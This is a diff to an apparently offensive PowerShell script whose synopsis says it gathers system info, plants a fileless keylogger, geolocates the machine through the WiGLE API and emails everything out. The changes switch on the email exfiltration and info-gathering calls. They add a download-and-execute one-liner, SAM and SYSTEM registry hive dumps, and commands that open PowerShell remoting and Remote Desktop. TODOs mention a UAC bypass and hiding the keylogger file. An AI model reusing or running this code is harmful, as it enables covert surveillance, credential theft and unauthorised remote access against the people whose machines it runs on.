@@ -7,38 +7,50 @@
 #############################################################################################################
 
 <#
+
+.SYNOPSIS
+Powershell script that 
+	Gathers info
+	Plants a fileless kelyogger
+	Finds the geolocation of the client through querrying the AP name in the Wiggle database
+	Sends all info through email back
+
 FIRST RUN "Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser"
 ########## OR #############
 USE 
 Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/axano/powershellScripts/master/scrapper.ps1')
-.SYNOPSIS
-.EXAMPLE
-.EXAMPLE
+
 .USEFUL	
 ### Measures time needed to execute certain command
 Measure-Command { commandToExecute }
+### Command to wipe the "downloaded form the internet" flag of a file
+Unblock-File c:\downloads\file.zip
+
 .TODO
 ###check if user is in administrator group, if true and script inst run as admin try UAC bypass
 https://stackoverflow.com/questions/21590719/check-if-user-is-a-member-of-the-local-admins-group-on-a-remote-server
+
+### hide keylogger produced file and change the name
+
 #>
 
 ### Add information to results
 function Main(){
-$results = "starters"
-#initialize
-#$results = nonAdministrativeScrapperFunctions
-
+$results = "RESULTS `n`n"
+initialize
+$results = nonAdministrativeScrapperFunctions
 ### Runs Key logger (does not require admin privs)
 #keyLogger
 $results += findGeoLocation
 $results
-#mail $results
+mail $results
 }
 
 function debug(){
 $hello = "Hello World"
 $hello | Out-File .\debug.txt
 }
+
 ### SMTP mailing tool
 ### Sends a mail using a free smtp server
 ### $messageBody is send as message body in the mail
@@ -191,6 +203,16 @@ reg save HKLM\SAM .\sam
 
 ### Dump system (needs administrator rights)
 reg save HKLM\SYSTEM .\system
+
+### Enables remoting, windows will listen on certain ports for incoming connections
+### TO connect enter "Enter-PSSession COMPUTER_NAME"
+### may need to provide credentials through -Cred parameter
+# needs to be tested!!!!
+Set-NetConnectionProfile -NetworkCategory Private -Force -SkipNetworkProfileCheck
+
+### Enable remode Desktop
+$regKey = "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server"
+Set-ItemProperty $regKey fDenyTSConnections 0
 }
 
 
@@ -276,6 +298,8 @@ $job = start-Job -scriptblock $scriptBlock
 # This function uses an authentication token given by WIGLE.
 # API docs can be found here : https://api.wigle.net/swagger#/Network%20search%20and%20information%20tools/search_1
 # TODO add try catch to filter pc's with no wireless connection
+# TODO catch when pc has 2 or more w-nic
+# There is a daily query limit ~5 requests
 function findGeoLocation(){
 	
 	# Gets current AP 
@@ -315,10 +339,8 @@ function findGeoLocation(){
 	$response = Invoke-RestMethod -Uri $uri -Headers $Headers
 	$response
 	$response.results
-	
-	
+		
 }
-
 
 
 ### Strict mode is scoped.
